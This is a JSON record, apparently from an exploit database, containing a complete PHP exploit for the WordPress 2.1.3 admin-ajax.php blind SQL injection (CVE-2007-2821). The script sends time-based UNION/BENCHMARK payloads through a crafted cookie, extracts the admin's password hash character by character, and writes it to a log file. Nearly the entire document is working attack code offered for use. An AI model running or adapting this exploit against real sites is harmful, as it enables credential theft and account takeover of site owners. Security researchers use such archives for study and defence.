{
  "id": "3960",
  "title": "WordPress Core 2.1.3 - &#039;admin-ajax.php&#039; SQL Injection Blind Fishing",
  "cve": "CVE-2007-2821",
  "vuln_type": "sqli",
  "code": "<?php\r\nerror_reporting(E_ALL);\r\n$norm_delay = 0;\r\n///////////////////////////////////////////////////////////////////////\r\n///////////////////////////////////////////////////////////////////////\r\n// WordPress 2.1.3 \"admin-ajax.php\" sql injection blind fishing exploit\r\n// written by Janek Vind \"waraxe\"\r\n// http://www.waraxe.us/\r\n// 21. may 2007\r\n///////////////////////////////////////////////////////////////////////\r\n///////////////////////////////////////////////////////////////////////\r\n//=====================================================================\r\n$outfile = './warlog.txt';// Log file\r\n$url = 'http://localhost/wordpress.2.1.3/wp-admin/admin-ajax.php';\r\n$testcnt = 300000;// Use bigger numbers, if server is slow, default is 300000\r\n$id = 1;// ID of the target user, default value \"1\" is admin's ID\r\n$suffix = '';// Override value, if needed\r\n$prefix = 'wp_';// WordPress table prefix, default is \"wp_\"\r\n//======================================================================\r\n\r\necho \"Target: $url\\n\";\r\necho \"sql table prefix: $prefix\\n\";\r\n\r\nif(empty($suffix))\r\n{\r\n\t$suffix = md5(substr($url, 0, strlen($url) - 24));\r\n}\r\n\r\necho \"cookie suffix: $suffix\\n\";\r\n\r\necho \"testing probe delays \\n\";\r\n\r\n$norm_delay = get_normdelay($testcnt);\r\necho \"normal delay: $norm_delay deciseconds\\n\";\r\n\r\n$hash = get_hash();\r\n\r\nadd_line(\"Target: $url\");\r\nadd_line(\"User ID: $id\");\r\nadd_line(\"Hash: $hash\");\r\n\r\necho \"\\nWork finished\\n\";\r\necho \"Questions and feedback - http://www.waraxe.us/ \\n\";\r\ndie(\"See ya! :) \\n\");\r\n///////////////////////////////////////////////////////////////////////\r\n///////////////////////////////////////////////////////////////////////\r\nfunction get_hash()\r\n{\r\n\t$len = 32;\r\n\t$field = 'user_pass';\r\n\t$out = '';\r\n\t\r\n\techo \"finding hash now ...\\n\";\r\n\t\r\n\tfor($i = 1; $i < $len + 1; $i ++)\r\n\t{\r\n\t\t$ch = get_hashchar($field,$i);\r\n\t\techo \"got $field pos $i --> $ch\\n\";\r\n\t\t$out .= \"$ch\";\r\n\t\techo \"current value for $field: $out \\n\";\r\n\t}\r\n\t\r\n\techo \"\\nFinal result: $field=$out\\n\\n\";\r\n\t\r\n\treturn $out;\r\n}\r\n///////////////////////////////////////////////////////////////////////\r\nfunction get_hashchar($field,$pos)\r\n{\r\n\tglobal $prefix, $suffix, $id, $testcnt;\r\n\t$char = '';\r\n\t$cnt = $testcnt * 4;\r\n\t$ppattern = 'cookie=wordpressuser_%s%%3dxyz%%2527%s; wordpresspass_%s%%3dp0hh';\r\n\t$ipattern = \" UNION ALL SELECT 1,2,user_pass,4,5,6,7,8,9,10 FROM %susers WHERE ID=%d AND IF(ORD(SUBSTRING($field,$pos,1))%s,BENCHMARK($cnt,MD5(1337)),3)/*\";\r\n\r\n\t// First let's determine, if it's number or letter\r\n\t$inj = sprintf($ipattern, $prefix, $id, \">57\");\r\n\t$post = sprintf($ppattern, $suffix, $inj, $suffix);\r\n\t$letter = test_condition($post);\r\n\t\r\n\tif($letter)\r\n\t{\r\n\t\t$min = 97;\r\n\t\t$max = 102;\r\n\t\techo \"char to find is [a-f]\\n\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\t$min = 48;\r\n\t\t$max = 57;\r\n\t\techo \"char to find is [0-9]\\n\";\r\n\t}\r\n\r\n\t$curr = 0;\r\n\t\r\n\twhile(1)\r\n\t{\r\n\t\t$area = $max - $min;\r\n\t\tif($area < 2 )\r\n\t\t{\r\n\t\t\t$inj = sprintf($ipattern, $prefix, $id, \"=$max\");\r\n\t\t\t$post = sprintf($ppattern, $suffix, $inj, $suffix);\r\n\t\t\t$eq = test_condition($post);\r\n\t\t\t\r\n\t\t\tif($eq)\r\n\t\t\t{\r\n\t\t\t\t$char = chr($max);\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\t$char = chr($min);\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\t\r\n\t\t$half = intval(floor($area / 2));\r\n\t\t$curr = $min + $half;\r\n\t\t\r\n\t\t$inj = sprintf($ipattern, $prefix, $id, \">$curr\");\r\n\t\t$post = sprintf($ppattern, $suffix, $inj, $suffix);\r\n\t\t\r\n\t\t$bigger = test_condition($post);\r\n\t\t\r\n\t\tif($bigger)\r\n\t\t{\r\n\t\t\t$min = $curr;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\t$max = $curr;\r\n\t\t}\r\n\r\n\t\techo \"curr: $curr--$max--$min\\n\";\r\n\t}\r\n\t\r\n\treturn $char;\r\n}\r\n///////////////////////////////////////////////////////////////////////\r\nfunction test_condition($p)\r\n{\r\n\tglobal $url, $norm_delay;\r\n\t$bret = false;\r\n\t$maxtry = 10;\r\n\t$try = 1;\r\n\t\r\n\twhile(1)\r\n\t{\r\n\t\t$start = getmicrotime();\r\n\t\t$buff = make_post($url, $p);\r\n\t\t$end = getmicrotime();\r\n\t\r\n\t\tif($buff === '-1')\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\techo \"test_condition() - try $try - invalid return value ...\\n\";\r\n\t\t\t$try ++;\r\n\t\t\tif($try > $maxtry)\r\n\t\t\t{\r\n\t\t\t\tdie(\"too many tries - exiting ...\\n\");\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\techo \"trying again - try $try ...\\n\";\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\t$diff = $end - $start;\r\n\t$delay = intval($diff * 10);\r\n\t\r\n\tif($delay > ($norm_delay * 2))\r\n\t{\r\n\t\t$bret = true;\r\n\t}\r\n\t\r\n\treturn $bret;\r\n}\r\n///////////////////////////////////////////////////////////////////////\r\nfunction get_normdelay($testcnt)\r\n{\r\n\t$fa = test_md5delay(1);\r\n\techo \"$fa\\n\";\r\n\t$sa = test_md5delay($testcnt);\r\n\techo \"$sa\\n\";\r\n\t$fb = test_md5delay(1);\r\n\techo \"$fb\\n\";\r\n\t$sb = test_md5delay($testcnt);\r\n\techo \"$sb\\n\";\r\n\t$fc = test_md5delay(1);\r\n\techo \"$fc\\n\";\r\n\t$sc = test_md5delay($testcnt);\r\n\techo \"$sc\\n\";\r\n\t\r\n\t$mean_nondelayed = intval(($fa + $fb + $fc) / 3);\r\n\techo \"mean nondelayed - $mean_nondelayed dsecs\\n\";\r\n\t$mean_delayed = intval(($sa + $sb + $sc) / 3);\r\n\techo \"mean delayed - $mean_delayed dsecs\\n\";\r\n\t\r\n\treturn $mean_delayed;\r\n}\r\n///////////////////////////////////////////////////////////////////////\r\nfunction test_md5delay($cnt)\r\n{\r\n\tglobal $url, $id, $prefix, $suffix;\r\n\t\r\n\t// delay in deciseconds\r\n\t$delay = -1;\r\n\t$ppattern = 'cookie=wordpressuser_%s%%3dxyz%%2527%s; wordpresspass_%s%%3dp0hh';\r\n\t$ipattern = ' UNION ALL SELECT 1,2,user_pass,4,5,6,7,8,9,10 FROM %susers WHERE ID=%d AND IF(LENGTH(user_pass)>31,BENCHMARK(%d,MD5(1337)),3)/*';\r\n\t$inj = sprintf($ipattern, $prefix, $id, $cnt);\r\n\t$post = sprintf($ppattern, $suffix, $inj, $suffix); \r\n\r\n\t$start = getmicrotime();\r\n\t$buff = make_post($url, $post);\r\n\t$end = getmicrotime();\r\n\t\r\n\tif(intval($buff) !== -1)\r\n\t{\r\n\t\tdie(\"test_md5delay($cnt) - invalid return value, exiting ...\");\r\n\t}\r\n\r\n\t$diff = $end - $start;\r\n\t$delay = intval($diff * 10);\r\n\r\n\treturn $delay;\r\n}\r\n///////////////////////////////////////////////////////////////////////\r\nfunction getmicrotime() \r\n{ \r\n    list($usec, $sec) = explode(\" \", microtime()); \r\n    return ((float)$usec + (float)$sec); \r\n} \r\n///////////////////////////////////////////////////////////////////////\r\nfunction make_post($url, $post_fields='', $cookie = '', $referer = '', $headers = FALSE)\r\n{\r\n\t$ch = curl_init();\r\n\t$timeout = 120;\r\n\tcurl_setopt ($ch, CURLOPT_URL, $url);\r\n\tcurl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);\r\n\tcurl_setopt($ch, CURLOPT_POST, 1); \r\n\tcurl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields); \r\n\tcurl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);\r\n\tcurl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)');\r\n\t\r\n\tif(!empty($cookie))\r\n\t{\r\n\t\tcurl_setopt ($ch, CURLOPT_COOKIE, $cookie);\r\n\t}\r\n \r\n\tif(!empty($referer))\r\n\t{\r\n\t\tcurl_setopt ($ch, CURLOPT_REFERER, $referer);\r\n\t}\r\n\r\n\tif($headers === TRUE)\r\n\t{\r\n\t\tcurl_setopt ($ch, CURLOPT_HEADER, TRUE);\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcurl_setopt ($ch, CURLOPT_HEADER, FALSE);\r\n\t}\r\n\r\n\t$fc = curl_exec($ch);\r\n\tcurl_close($ch);\r\n\t\r\n\treturn $fc;\r\n}\r\n///////////////////////////////////////////////////////////////////////\r\nfunction add_line($buf)\r\n{\r\n\tglobal $outfile;\r\n\t\r\n\t$buf .= \"\\n\";\r\n\t$fh = fopen($outfile, 'ab');\r\n\tfwrite($fh, $buf);\r\n\tfclose($fh);\r\n\t\r\n}\r\n///////////////////////////////////////////////////////////////////////\r\n?>\r\n\r\n# milw0rm.com [2007-05-21]",
  "url": "https://www.exploit-db.com/exploits/3960"
}